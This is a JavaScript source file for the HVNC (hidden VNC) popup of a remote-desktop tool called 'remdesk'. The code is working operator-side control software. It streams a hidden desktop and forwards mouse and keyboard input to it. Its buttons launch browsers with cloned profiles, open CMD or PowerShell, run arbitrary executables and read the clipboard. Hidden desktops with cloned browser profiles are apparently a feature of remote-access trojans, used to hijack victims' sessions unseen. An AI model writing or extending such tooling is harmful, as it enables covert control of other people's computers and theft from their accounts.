/**
 * HVNC Popup Window with Mouse/Keyboard Input
 * 
 * Provides a separate window for HVNC desktop interaction:
 * - Video streaming display (instead of static images)
 * - Mouse and keyboard input that routes to HVNC desktop
 * - Control panel with quick actions
 * - Independent from main desktop input
 */
(() => {
  "use strict";

  const remdesk = window.remdesk || (window.remdesk = {});
  const { state, dom, constants } = remdesk;
  const { CONTROL_TYPES } = constants;

  // HVNC Popup State
  const hvncPopupState = {
    isOpen: false,
    isDragging: false,
    isResizing: false,
    dragOffset: { x: 0, y: 0 },
    position: { x: 100, y: 100 },
    size: { width: 800, height: 600 },
    minSize: { width: 400, height: 300 },
    cursorPosition: { x: 0, y: 0 },
    mouseButtonsDown: new Set(),
    pressedKeys: new Set(),
    videoStream: null,
    controlEnabled: true,
  };

  // DOM Elements cache
  let hvncPopupDom = null;

  /**
   * Initialize HVNC Popup DOM elements
   */
  function initHvncPopupDom() {
    if (hvncPopupDom) return hvncPopupDom;
    
    hvncPopupDom = {
      window: document.getElementById("hvncPopupWindow"),
      header: document.getElementById("hvncPopupHeader"),
      title: document.getElementById("hvncPopupTitle"),
      closeBtn: document.getElementById("hvncPopupClose"),
      minimizeBtn: document.getElementById("hvncPopupMinimize"),
      maximizeBtn: document.getElementById("hvncPopupMaximize"),
      body: document.getElementById("hvncPopupBody"),
      screenFrame: document.getElementById("hvncPopupScreenFrame"),
      video: document.getElementById("hvncPopupVideo"),
      img: document.getElementById("hvncPopupImg"),
      placeholder: document.getElementById("hvncPopupPlaceholder"),
      statusBar: document.getElementById("hvncPopupStatus"),
      controlPanel: document.getElementById("hvncPopupControlPanel"),
      resizeHandle: document.getElementById("hvncPopupResize"),
      // Sliders
      intervalSlider: document.getElementById("hvncPopupIntervalSlider"),
      intervalValue: document.getElementById("hvncPopupIntervalValue"),
      qualitySlider: document.getElementById("hvncPopupQualitySlider"),
      qualityValue: document.getElementById("hvncPopupQualityValue"),
      resizeSlider: document.getElementById("hvncPopupResizeSlider"),
      resizeValue: document.getElementById("hvncPopupResizeValue"),
    };
    
    return hvncPopupDom;
  }

  /**
   * Create HVNC Popup Window HTML if not exists
   */
  function createHvncPopupWindow() {
    if (document.getElementById("hvncPopupWindow")) {
      initHvncPopupDom();
      return;
    }

    const popup = document.createElement("div");
    popup.id = "hvncPopupWindow";
    popup.className = "hvnc-popup-window";
    popup.style.display = "none";
    popup.innerHTML = `
      <div class="hvnc-popup-header" id="hvncPopupHeader">
        <span class="hvnc-popup-title" id="hvncPopupTitle">HVNC Desktop</span>
        <div class="hvnc-popup-controls">
          <button class="hvnc-popup-btn" id="hvncPopupMinimize" title="Minimize">−</button>
          <button class="hvnc-popup-btn" id="hvncPopupMaximize" title="Maximize">□</button>
          <button class="hvnc-popup-btn close" id="hvncPopupClose" title="Close">×</button>
        </div>
      </div>
      <div class="hvnc-popup-body" id="hvncPopupBody">
        <div class="hvnc-popup-screen-frame" id="hvncPopupScreenFrame" tabindex="0">
          <video id="hvncPopupVideo" autoplay playsinline muted style="display:none;"></video>
          <img id="hvncPopupImg" class="hvnc-popup-img" alt="HVNC Screen" style="display:none;" />
          <div class="hvnc-popup-placeholder" id="hvncPopupPlaceholder">
            <span class="hvnc-popup-icon">🖥️</span>
            <span class="hvnc-popup-text">HVNC Desktop</span>
            <span class="hvnc-popup-hint">Start HVNC to begin</span>
          </div>
        </div>
        <div class="hvnc-popup-control-panel" id="hvncPopupControlPanel">
          <div class="hvnc-popup-actions">
            <button class="hvnc-popup-action-btn" data-hvnc-action="browsers" title="Launch browser">
              <span>🌐</span> Browsers
            </button>
            <button class="hvnc-popup-action-btn" data-hvnc-action="cmd" title="Open CMD">
              <span>⬛</span> CMD
            </button>
            <button class="hvnc-popup-action-btn" data-hvnc-action="powershell" title="Open PowerShell">
              <span>🔵</span> PowerShell
            </button>
            <button class="hvnc-popup-action-btn" data-hvnc-action="explorer" title="Open Explorer">
              <span>📁</span> Explorer
            </button>
            <button class="hvnc-popup-action-btn" data-hvnc-action="run" title="Run EXE">
              <span>▶️</span> Run EXE
            </button>
            <button class="hvnc-popup-action-btn" data-hvnc-action="get_clipboard" title="Get Clipboard">
              <span>📋</span> Clipboard
            </button>
          </div>
          <div class="hvnc-popup-settings">
            <div class="hvnc-popup-setting">
              <label>Interval: <span id="hvncPopupIntervalValue">500</span>ms</label>
              <input type="range" id="hvncPopupIntervalSlider" min="100" max="2000" value="500" step="100" />
            </div>
            <div class="hvnc-popup-setting">
              <label>Quality: <span id="hvncPopupQualityValue">50</span>%</label>
              <input type="range" id="hvncPopupQualitySlider" min="10" max="100" value="50" step="5" />
            </div>
            <div class="hvnc-popup-setting">
              <label>Scale: <span id="hvncPopupResizeValue">50</span>%</label>
              <input type="range" id="hvncPopupResizeSlider" min="25" max="100" value="50" step="5" />
            </div>
          </div>
        </div>
      </div>
      <div class="hvnc-popup-statusbar" id="hvncPopupStatus">Ready</div>
      <div class="hvnc-popup-resize" id="hvncPopupResize"></div>
    `;

    document.body.appendChild(popup);
    initHvncPopupDom();
    bindHvncPopupEvents();
  }

  /**
   * Bind all HVNC Popup events
   */
  function bindHvncPopupEvents() {
    const d = hvncPopupDom;
    if (!d || !d.window) return;

    // Window controls
    if (d.closeBtn) {
      d.closeBtn.addEventListener("click", closeHvncPopup);
    }
    if (d.minimizeBtn) {
      d.minimizeBtn.addEventListener("click", minimizeHvncPopup);
    }
    if (d.maximizeBtn) {
      d.maximizeBtn.addEventListener("click", toggleMaximizeHvncPopup);
    }

    // Dragging
    if (d.header) {
      d.header.addEventListener("mousedown", startDrag);
    }

    // Resizing
    if (d.resizeHandle) {
      d.resizeHandle.addEventListener("mousedown", startResize);
    }

    // Mouse/Keyboard input for HVNC screen
    if (d.screenFrame) {
      bindHvncInputEvents(d.screenFrame);
    }

    // Action buttons
    const actionBtns = d.window.querySelectorAll("[data-hvnc-action]");
    actionBtns.forEach(btn => {
      btn.addEventListener("click", () => {
        const action = btn.dataset.hvncAction;
        if (action && remdesk.hvnc) {
          handleHvncPopupAction(action);
        }
      });
    });

    // Sliders
    if (d.intervalSlider) {
      d.intervalSlider.addEventListener("input", (e) => {
        if (d.intervalValue) d.intervalValue.textContent = e.target.value;
        if (remdesk.hvnc) remdesk.hvnc.state.settings.interval = parseInt(e.target.value, 10);
      });
    }
    if (d.qualitySlider) {
      d.qualitySlider.addEventListener("input", (e) => {
        if (d.qualityValue) d.qualityValue.textContent = e.target.value;
        if (remdesk.hvnc) remdesk.hvnc.state.settings.quality = parseInt(e.target.value, 10);
      });
    }
    if (d.resizeSlider) {
      d.resizeSlider.addEventListener("input", (e) => {
        if (d.resizeValue) d.resizeValue.textContent = e.target.value;
        if (remdesk.hvnc) remdesk.hvnc.state.settings.resize = parseInt(e.target.value, 10);
      });
    }

    // Global mouse up/move for dragging/resizing
    document.addEventListener("mousemove", handleMouseMove);
    document.addEventListener("mouseup", handleMouseUp);
  }

  /**
   * Bind mouse and keyboard input events for HVNC screen
   */
  function bindHvncInputEvents(screenFrame) {
    // Prevent default context menu
    screenFrame.addEventListener("contextmenu", (e) => {
      e.preventDefault();
    });

    // Mouse move
    screenFrame.addEventListener("mousemove", (e) => {
      if (!hvncPopupState.controlEnabled || !state.isConnected) return;
      
      const pos = getHvncCursorPosition(e, screenFrame);
      hvncPopupState.cursorPosition = pos;
      
      sendHvncControl({
        type: CONTROL_TYPES.mouseMove,
        x: pos.x,
        y: pos.y,
        hvnc: true,
      });
    });

    // Mouse down
    screenFrame.addEventListener("mousedown", (e) => {
      if (!hvncPopupState.controlEnabled || !state.isConnected) return;
      
      e.preventDefault();
      screenFrame.focus();
      
      const button = mapMouseButton(e.button);
      hvncPopupState.mouseButtonsDown.add(button);
      
      const pos = getHvncCursorPosition(e, screenFrame);
      hvncPopupState.cursorPosition = pos;
      
      sendHvncControl({
        type: CONTROL_TYPES.mouseDown,
        x: pos.x,
        y: pos.y,
        button,
        hvnc: true,
      });
    });

    // Mouse up
    screenFrame.addEventListener("mouseup", (e) => {
      if (!hvncPopupState.controlEnabled || !state.isConnected) return;
      
      const button = mapMouseButton(e.button);
      hvncPopupState.mouseButtonsDown.delete(button);
      
      const pos = getHvncCursorPosition(e, screenFrame);
      
      sendHvncControl({
        type: CONTROL_TYPES.mouseUp,
        x: pos.x,
        y: pos.y,
        button,
        hvnc: true,
      });
    });

    // Mouse wheel
    screenFrame.addEventListener("wheel", (e) => {
      if (!hvncPopupState.controlEnabled || !state.isConnected) return;
      
      e.preventDefault();
      
      const pos = getHvncCursorPosition(e, screenFrame);
      const deltaX = normalizeWheelDelta(e.deltaX, e.deltaMode);
      const deltaY = normalizeWheelDelta(e.deltaY, e.deltaMode);
      
      sendHvncControl({
        type: CONTROL_TYPES.mouseScroll,
        x: pos.x,
        y: pos.y,
        delta_x: deltaX,
        delta_y: deltaY,
        hvnc: true,
      });
    }, { passive: false });

    // Key down
    screenFrame.addEventListener("keydown", (e) => {
      if (!hvncPopupState.controlEnabled || !state.isConnected) return;
      
      e.preventDefault();
      
      const hasChord = e.ctrlKey || e.altKey || e.metaKey;
      const isPrintable = e.key && e.key.length === 1;
      
      if (isPrintable && !hasChord) {
        sendHvncControl({
          type: CONTROL_TYPES.text,
          text: e.key,
          hvnc: true,
        });
        return;
      }
      
      const key = normalizeKeyCode(e);
      if (!key) return;
      
      if (e.repeat && hvncPopupState.pressedKeys.has(key)) return;
      
      if (!hvncPopupState.pressedKeys.has(key)) {
        hvncPopupState.pressedKeys.add(key);
        sendHvncControl({
          type: CONTROL_TYPES.keyDown,
          key,
          hvnc: true,
        });
      }
    });

    // Key up
    screenFrame.addEventListener("keyup", (e) => {
      if (!hvncPopupState.controlEnabled || !state.isConnected) return;
      
      e.preventDefault();
      
      const key = normalizeKeyCode(e);
      if (!key) return;
      
      if (!hvncPopupState.pressedKeys.has(key)) return;
      
      hvncPopupState.pressedKeys.delete(key);
      sendHvncControl({
        type: CONTROL_TYPES.keyUp,
        key,
        hvnc: true,
      });
    });

    // Release all inputs when focus is lost
    screenFrame.addEventListener("blur", () => {
      releaseHvncInputs();
    });
  }

  /**
   * Get cursor position relative to HVNC video/image
   * Works with both video stream mode and static image mode
   */
  function getHvncCursorPosition(event, screenFrame) {
    const video = hvncPopupDom?.video;
    const img = hvncPopupDom?.img;
    
    // Default resolution (HVNC desktop resolution)
    let nativeWidth = 1920;
    let nativeHeight = 1080;
    
    // Try to get actual dimensions from video or image
    if (video && video.style.display !== "none" && video.videoWidth > 0) {
      nativeWidth = video.videoWidth;
      nativeHeight = video.videoHeight;
    } else if (img && img.style.display !== "none" && img.naturalWidth > 0) {
      nativeWidth = img.naturalWidth;
      nativeHeight = img.naturalHeight;
    }

    const rect = screenFrame.getBoundingClientRect();
    
    // Calculate actual displayed area (respecting object-fit: contain)
    const displayedWidth = rect.width;
    const displayedHeight = rect.height;
    const displayAspect = displayedWidth / displayedHeight;
    const nativeAspect = nativeWidth / nativeHeight;
    
    let offsetX = 0;
    let offsetY = 0;
    let actualWidth = displayedWidth;
    let actualHeight = displayedHeight;
    
    // Calculate offset due to object-fit: contain
    if (displayAspect > nativeAspect) {
      // Display is wider - black bars on sides
      actualWidth = displayedHeight * nativeAspect;
      offsetX = (displayedWidth - actualWidth) / 2;
    } else {
      // Display is taller - black bars on top/bottom
      actualHeight = displayedWidth / nativeAspect;
      offsetY = (displayedHeight - actualHeight) / 2;
    }
    
    const scaleX = nativeWidth / actualWidth;
    const scaleY = nativeHeight / actualHeight;
    
    const x = Math.round((event.clientX - rect.left - offsetX) * scaleX);
    const y = Math.round((event.clientY - rect.top - offsetY) * scaleY);
    
    return {
      x: Math.max(0, Math.min(nativeWidth, x)),
      y: Math.max(0, Math.min(nativeHeight, y)),
    };
  }

  /**
   * Map mouse button number to button name
   */
  function mapMouseButton(button) {
    switch (button) {
      case 0: return "left";
      case 1: return "middle";
      case 2: return "right";
      case 3: return "x1";
      case 4: return "x2";
      default: return "left";
    }
  }

  /**
   * Normalize wheel delta
   */
  function normalizeWheelDelta(delta, mode) {
    if (mode === 1) return Math.round(delta * 40);
    if (mode === 2) return Math.round(delta * window.innerHeight);
    return Math.round(delta);
  }

  /**
   * Normalize key code from event
   */
  function normalizeKeyCode(event) {
    const { KEY_MAP } = remdesk;
    
    // Check for special keys first
    if (KEY_MAP && KEY_MAP[event.code]) {
      return KEY_MAP[event.code];
    }
    
    // Use key for single characters
    if (event.key && event.key.length === 1) {
      return event.key;
    }
    
    // Fallback to code
    return event.code || event.key;
  }

  /**
   * Send control command to HVNC desktop
   */
  function sendHvncControl(payload) {
    if (!state.controlChannel || state.controlChannel.readyState !== "open") {
      return;
    }

    // All HVNC controls have hvnc: true flag
    const message = { ...payload, hvnc: true };

    try {
      if (remdesk.sendEncrypted) {
        remdesk.sendEncrypted(message);
      } else if (remdesk.encodeOutgoing) {
        remdesk.encodeOutgoing(message).then(encoded => {
          state.controlChannel.send(encoded);
        }).catch(err => {
          console.error("Failed to encode HVNC control:", err);
        });
      } else {
        state.controlChannel.send(JSON.stringify(message));
      }
    } catch (err) {
      console.error("Failed to send HVNC control:", err);
    }
  }

  /**
   * Release all pressed HVNC inputs
   */
  function releaseHvncInputs() {
    if (!state.isConnected) {
      hvncPopupState.mouseButtonsDown.clear();
      hvncPopupState.pressedKeys.clear();
      return;
    }

    const pos = hvncPopupState.cursorPosition;

    // Release mouse buttons
    hvncPopupState.mouseButtonsDown.forEach(button => {
      sendHvncControl({
        type: CONTROL_TYPES.mouseUp,
        x: pos.x,
        y: pos.y,
        button,
        hvnc: true,
      });
    });
    hvncPopupState.mouseButtonsDown.clear();

    // Release keys
    hvncPopupState.pressedKeys.forEach(key => {
      sendHvncControl({
        type: CONTROL_TYPES.keyUp,
        key,
        hvnc: true,
      });
    });
    hvncPopupState.pressedKeys.clear();
  }

  /**
   * Handle HVNC popup action button click
   */
  function handleHvncPopupAction(action) {
    if (!remdesk.hvnc) return;

    switch (action) {
      case "browsers":
        // Show browser selection dialog
        const browserDialog = document.getElementById("hvncBrowserDialog");
        if (browserDialog) {
          browserDialog.style.display = "flex";
        } else {
          // Simple prompt fallback
          const browser = prompt("Select browser: chrome, firefox, edge, opera, brave", "chrome");
          if (browser) {
            remdesk.hvnc.sendAction("launch_browser", { browser, clone_profile: true });
          }
        }
        break;
      
      case "cmd":
        remdesk.hvnc.sendAction("launch_cmd");
        break;
      
      case "powershell":
        remdesk.hvnc.sendAction("launch_powershell");
        break;
      
      case "explorer":
        remdesk.hvnc.sendAction("launch_explorer");
        break;
      
      case "run":
        const runDialog = document.getElementById("hvncRunDialog");
        if (runDialog) {
          runDialog.style.display = "flex";
        } else {
          const path = prompt("Enter executable path:");
          if (path) {
            const args = prompt("Enter arguments (optional):", "");
            remdesk.hvnc.sendAction("run_exe", { path, args });
          }
        }
        break;
      
      case "get_clipboard":
        remdesk.hvnc.sendAction("get_clipboard");
        break;
      
      default:
        remdesk.hvnc.sendAction(action);
    }
  }

  /**
   * Set HVNC video stream source
   */
  function setHvncVideoStream(stream) {
    if (!hvncPopupDom?.video) return;
    
    hvncPopupState.videoStream = stream;
    hvncPopupDom.video.srcObject = stream;
    
    if (stream) {
      hvncPopupDom.video.style.display = "block";
      if (hvncPopupDom.img) hvncPopupDom.img.style.display = "none";
      if (hvncPopupDom.placeholder) {
        hvncPopupDom.placeholder.style.display = "none";
      }
    } else {
      hvncPopupDom.video.style.display = "none";
      if (hvncPopupDom.placeholder) {
        hvncPopupDom.placeholder.style.display = "flex";
      }
    }
  }

  /**
   * Update HVNC frame image (for static frame mode)
   */
  function updateHvncFrame(base64Data) {
    if (!hvncPopupDom?.img) return;
    
    if (base64Data) {
      hvncPopupDom.img.src = "data:image/jpeg;base64," + base64Data;
      hvncPopupDom.img.style.display = "block";
      if (hvncPopupDom.video) hvncPopupDom.video.style.display = "none";
      if (hvncPopupDom.placeholder) {
        hvncPopupDom.placeholder.style.display = "none";
      }
    }
  }

  /**
   * Show placeholder (no HVNC active)
   */
  function showHvncPlaceholder() {
    if (!hvncPopupDom) return;
    
    if (hvncPopupDom.img) hvncPopupDom.img.style.display = "none";
    if (hvncPopupDom.video) hvncPopupDom.video.style.display = "none";
    if (hvncPopupDom.placeholder) {
      hvncPopupDom.placeholder.style.display = "flex";
    }
  }

  /**
   * Update HVNC popup status
   */
  function setHvncPopupStatus(message) {
    if (hvncPopupDom?.statusBar) {
      hvncPopupDom.statusBar.textContent = message;
    }
  }

  // ===== Window Management =====

  /**
   * Constrain popup position to stay within viewport bounds (for PyQt WebView)
   */
  function constrainPopupToViewport() {
    const winWidth = window.innerWidth;
    const winHeight = window.innerHeight;
    const padding = 10; // Keep some padding from edges
    
    // Ensure popup doesn't exceed viewport width
    if (hvncPopupState.size.width > winWidth - padding * 2) {
      hvncPopupState.size.width = Math.max(hvncPopupState.minSize.width, winWidth - padding * 2);
    }
    
    // Ensure popup doesn't exceed viewport height
    if (hvncPopupState.size.height > winHeight - padding * 2) {
      hvncPopupState.size.height = Math.max(hvncPopupState.minSize.height, winHeight - padding * 2);
    }
    
    // Ensure popup doesn't go off left edge
    if (hvncPopupState.position.x < padding) {
      hvncPopupState.position.x = padding;
    }
    
    // Ensure popup doesn't go off right edge
    if (hvncPopupState.position.x + hvncPopupState.size.width > winWidth - padding) {
      hvncPopupState.position.x = Math.max(padding, winWidth - hvncPopupState.size.width - padding);
    }
    
    // Ensure popup doesn't go off top edge (allow title bar to show)
    if (hvncPopupState.position.y < padding) {
      hvncPopupState.position.y = padding;
    }
    
    // Ensure popup doesn't go off bottom edge
    if (hvncPopupState.position.y + hvncPopupState.size.height > winHeight - padding) {
      hvncPopupState.position.y = Math.max(padding, winHeight - hvncPopupState.size.height - padding);
    }
  }

  /**
   * Open HVNC Popup Window
   */
  function openHvncPopup() {
    createHvncPopupWindow();
    
    if (!hvncPopupDom?.window) {
      console.error("HVNC Popup: window element not found after creation");
      return;
    }
    
    hvncPopupState.isOpen = true;
    hvncPopupDom.window.style.display = "flex";
    
    // Get viewport dimensions
    const winWidth = window.innerWidth;
    const winHeight = window.innerHeight;
    
    // Auto-size popup based on viewport (max 80% of viewport)
    const maxWidth = Math.min(hvncPopupState.size.width, winWidth * 0.8);
    const maxHeight = Math.min(hvncPopupState.size.height, winHeight * 0.8);
    hvncPopupState.size.width = Math.max(hvncPopupState.minSize.width, maxWidth);
    hvncPopupState.size.height = Math.max(hvncPopupState.minSize.height, maxHeight);
    
    // Center window if first open or re-center if position is default
    if (hvncPopupState.position.x === 100 && hvncPopupState.position.y === 100) {
      hvncPopupState.position.x = Math.max(10, (winWidth - hvncPopupState.size.width) / 2);
      hvncPopupState.position.y = Math.max(10, (winHeight - hvncPopupState.size.height) / 2);
    }
    
    // Constrain to viewport (important for PyQt WebView)
    constrainPopupToViewport();
    
    applyHvncPopupPosition();
    applyHvncPopupSize();
    
    // Focus the screen frame for keyboard input
    setTimeout(() => {
      if (hvncPopupDom?.screenFrame) {
        hvncPopupDom.screenFrame.focus();
      }
    }, 100);
    
    console.info("HVNC Popup opened, size:", hvncPopupState.size, "position:", hvncPopupState.position);
  }

  /**
   * Close HVNC Popup Window
   */
  function closeHvncPopup() {
    if (!hvncPopupDom?.window) return;
    
    releaseHvncInputs();
    hvncPopupState.isOpen = false;
    hvncPopupDom.window.style.display = "none";
    
    console.info("HVNC Popup closed");
  }

  /**
   * Minimize HVNC Popup Window
   */
  function minimizeHvncPopup() {
    if (!hvncPopupDom?.window) return;
    hvncPopupDom.window.classList.toggle("minimized");
  }

  /**
   * Toggle maximize HVNC Popup Window
   */
  function toggleMaximizeHvncPopup() {
    if (!hvncPopupDom?.window) return;
    hvncPopupDom.window.classList.toggle("maximized");
    
    if (hvncPopupDom.window.classList.contains("maximized")) {
      hvncPopupDom.window.style.left = "0";
      hvncPopupDom.window.style.top = "0";
      hvncPopupDom.window.style.width = "100vw";
      hvncPopupDom.window.style.height = "100vh";
    } else {
      applyHvncPopupPosition();
      applyHvncPopupSize();
    }
  }

  /**
   * Apply saved position to popup
   */
  function applyHvncPopupPosition() {
    if (!hvncPopupDom?.window) return;
    hvncPopupDom.window.style.left = hvncPopupState.position.x + "px";
    hvncPopupDom.window.style.top = hvncPopupState.position.y + "px";
  }

  /**
   * Apply saved size to popup
   */
  function applyHvncPopupSize() {
    if (!hvncPopupDom?.window) return;
    hvncPopupDom.window.style.width = hvncPopupState.size.width + "px";
    hvncPopupDom.window.style.height = hvncPopupState.size.height + "px";
  }

  // ===== Drag & Resize =====

  function startDrag(e) {
    if (e.target.closest(".hvnc-popup-controls")) return;
    if (hvncPopupDom?.window?.classList.contains("maximized")) return;
    
    hvncPopupState.isDragging = true;
    hvncPopupState.dragOffset.x = e.clientX - hvncPopupState.position.x;
    hvncPopupState.dragOffset.y = e.clientY - hvncPopupState.position.y;
  }

  function startResize(e) {
    if (hvncPopupDom?.window?.classList.contains("maximized")) return;
    
    hvncPopupState.isResizing = true;
    e.preventDefault();
  }

  function handleMouseMove(e) {
    if (hvncPopupState.isDragging) {
      hvncPopupState.position.x = e.clientX - hvncPopupState.dragOffset.x;
      hvncPopupState.position.y = e.clientY - hvncPopupState.dragOffset.y;
      
      // Constrain to viewport (for PyQt WebView - don't allow popup to go outside)
      constrainPopupToViewport();
      
      applyHvncPopupPosition();
    }
    
    if (hvncPopupState.isResizing) {
      const rect = hvncPopupDom.window.getBoundingClientRect();
      let newWidth = Math.max(hvncPopupState.minSize.width, e.clientX - rect.left);
      let newHeight = Math.max(hvncPopupState.minSize.height, e.clientY - rect.top);
      
      // Constrain resize to viewport bounds
      const winWidth = window.innerWidth;
      const winHeight = window.innerHeight;
      const padding = 10;
      
      newWidth = Math.min(newWidth, winWidth - hvncPopupState.position.x - padding);
      newHeight = Math.min(newHeight, winHeight - hvncPopupState.position.y - padding);
      
      hvncPopupState.size.width = Math.max(hvncPopupState.minSize.width, newWidth);
      hvncPopupState.size.height = Math.max(hvncPopupState.minSize.height, newHeight);
      
      applyHvncPopupSize();
    }
  }

  function handleMouseUp() {
    hvncPopupState.isDragging = false;
    hvncPopupState.isResizing = false;
  }

  // ===== Exports =====

  remdesk.hvncPopup = {
    state: hvncPopupState,
    open: openHvncPopup,
    close: closeHvncPopup,
    minimize: minimizeHvncPopup,
    toggleMaximize: toggleMaximizeHvncPopup,
    setVideoStream: setHvncVideoStream,
    updateFrame: updateHvncFrame,
    showPlaceholder: showHvncPlaceholder,
    setStatus: setHvncPopupStatus,
    sendControl: sendHvncControl,
    releaseInputs: releaseHvncInputs,
    isOpen: () => hvncPopupState.isOpen,
    init: createHvncPopupWindow,
  };

  // Auto-init when DOM is ready
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", createHvncPopupWindow);
  } else {
    createHvncPopupWindow();
  }
})();
